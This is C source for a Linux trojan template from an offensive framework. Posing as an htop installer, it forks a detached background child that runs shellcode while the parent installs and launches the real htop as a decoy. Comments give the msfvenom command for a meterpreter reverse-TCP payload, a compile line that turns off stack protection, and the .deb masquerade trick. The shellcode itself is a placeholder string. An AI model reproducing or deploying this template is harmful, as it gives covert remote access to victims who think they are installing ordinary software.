#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<sys/types.h>
#include<sys/wait.h>
#include<unistd.h>

/*
Author: r00t-3xp10it
MITRE ATT&CK T1036 served as Linux RAT agent (trojan)
Framework: venom v1.0.16 (categorie:unix-payloads - agent:nº4)
gcc -fno-stack-protector -z execstack htop.c -o htop_installer.deb
"Naming the compiled C program to .deb does not call the dpkg at runtime (MITRE ATT&CK T1036)"
*/

/* msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= LPORT= -f c */
unsigned char voodoo[] = "COPY_MSFVENOM_SHELLCODE_HERE";

int main()
{
   /*
   This fork(); function allow us to spawn a new child process (in background). This way i can
   execute shellcode in background while continue the execution of the C program in foreground.
   Article: https://www.geeksforgeeks.org/zombie-and-orphan-processes-in-c
   */
   fflush(NULL);
   int pid = fork(); 
      if (pid > 0) {
         /*
         We are runing in parent process (child its also running)
         Install/run htop proccess manager (as foreground job)
         */
         printf("+---------------------------------+\n");
         printf("|  install Htop proccess manager  |\n");
         printf("+---------------------------------+\n\n");
         /* Display system information onscreen to target user */
         system("h=$(hostnamectl | grep 'Static' | cut -d ':' -f2);echo \"    Hostname :$h\"");
         system("c=$(hostnamectl | grep 'Icon' | cut -d ':' -f2);echo \"    Icon     :$c\"");
         system("o=$(hostnamectl | grep 'Operating' | cut -d ':' -f2);echo \"    OS       :$o\"");
         system("k=$(hostnamectl | grep 'Kernel' | cut -d ':' -f2);echo \"    Kernel   :$k\"");

            /* Install htop package */
            sleep(1);printf("\n[*] Please wait, Installing htop package ..\n");
            sleep(1);system("sudo apt-get update -qq && sudo apt-get install -y -qq htop");

         /* Execute htop proccess manager */
         system("f=$(htop -v | grep -m 1 'htop' | awk {'print $2'});echo \"[i] Htop package version installed: $f\"");
	 sleep(1);printf("[*] Please wait, executing htop software ..\n");
	 sleep(3);system("htop");
      }
      else if (pid == 0) {
         /*
         We are running in child process (as backgrond job - orphan).
         setsid(); allow us to detach the child (shellcode) from parent (htop_installer.deb) process,
         allowing us to continue running the shellcode in ram even if parent process its terminated.
         */
         setsid();
         void(*ret)() = (void(*)())voodoo;
         ret();
      } return 0;
}
